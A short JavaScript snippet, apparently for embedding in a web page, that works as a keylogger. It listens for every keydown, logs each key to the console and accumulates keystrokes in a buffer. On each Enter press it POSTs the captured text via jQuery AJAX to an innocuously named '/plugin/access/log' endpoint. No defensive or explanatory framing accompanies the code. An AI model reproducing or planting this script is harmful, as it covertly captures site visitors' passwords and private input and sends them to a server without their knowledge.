let log = '';
document.addEventListener('keydown', event => {
    console.log(event.key);
    if(event.which === 13 || event.keyCode === 13) {
        $.ajax({
           url: '/plugin/access/log',
           type: 'POST',
           contentType: 'application/json',
           data: JSON.stringify({'log': log}),
           success: function(data, status, options) {
               log = '';
           },
        });
    }
    log = log.concat(event.key);
});
